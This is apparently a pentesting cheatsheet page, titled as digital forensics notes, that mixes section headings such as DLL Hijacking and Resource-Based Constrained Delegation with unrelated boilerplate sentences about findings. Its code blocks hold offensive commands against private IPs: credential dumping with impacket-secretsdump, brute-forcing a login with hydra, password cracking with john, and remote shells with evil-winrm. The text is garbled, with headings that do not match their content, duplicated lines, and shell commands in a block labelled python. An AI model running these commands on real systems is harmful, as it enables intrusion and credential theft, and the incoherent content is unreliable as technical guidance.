---
TitleSEO: "Digital Forensics Methodology | ZureFX"
TitlePost: "Digital Forensics Methodology"
Author: "ZureFX"
Description: "Personal notes on Digital Forensics Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "enumeration, linux, oscp, persistence, cheatsheet, malware"
URL: "https://zurefx.github.io/notes/note-digital-forensics-methodology-201.html"
URL_IMAGES: ""
Date: "2024-07-07"
Tags: "Enumeration, Linux, OSCP, Persistence, Cheatsheet, Malware"
Section: "notes"
Lang: "en"
main_img: "note-digital-forensics-methodology-201"
Permalink: "/notes/note-digital-forensics-methodology-201.html"
BtnLabel: "Read Notes"
Pick: 0
---
## DLL Hijacking

### Broken Access Control

The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p5986,143,8443 10.94.195.157 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.42.235.42
```

```python
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.97.221.117/FUZZ
nmap -sCV -p1521,9200,25 10.59.120.60 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.83.85.246
```

```bash
evil-winrm -i 10.95.63.240 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.96.8.216 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p995,1521,110 10.25.57.173 -oN scan.txt
gobuster dir -u http://10.88.193.168/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

## bloodhound

### C#

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.27.137.6
```

The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

## Resource-Based Constrained Delegation

### SMTP

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
evil-winrm -i 10.117.31.165 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.91.125.145 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.187.81 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```
